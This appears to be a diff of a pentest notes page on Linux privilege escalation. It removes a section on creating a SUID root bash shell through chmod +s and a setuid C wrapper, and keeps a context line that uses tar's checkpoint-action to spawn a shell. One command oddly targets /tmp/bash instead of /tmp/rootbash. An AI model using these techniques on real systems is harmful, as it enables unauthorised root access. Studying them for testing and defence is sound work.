@@ -27,51 +27,6 @@ $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/
 
 <hr class="sep-both">
 
-## Create a root bash
-
-<div class="row row-cols-md-2 mt-3"><div>
-
-* ➡️ Version 1: with root executing 2 commands
-
-```ps
-$ cp /bin/bash /tmp/rootbash
-```
-
-Run **as root** (SUID executable, sudo...) the commands
-
-```ps
-$ chown root /tmp/rootbash
-$ chmod +s /tmp/bash
-```
-
-Run the bash with `-p` and enjoy.
-
-```ps
-$ /tmp/rootbash -p
-```
-</div><div>
-
-* ➡️ Version 2: with root executing an executable
-
-```c
-int main() {
-  setgid(0);
-  setuid(0);
-  system("/bin/bash");
-  return 0;
-}
-```
-
-```ps
-$ gcc xxx.c -o rootbash
-```
-
-Then, you have to execute `rootbash` as root, either using a misconfiguration in sudo, SUID, cron jobs...
-
-</div></div>
-
-<hr class="sep-both">
-
 ## ⚡ SUID `systemctl` script
 
 Description: this script makes it easier to run several commands using `systemctl`.
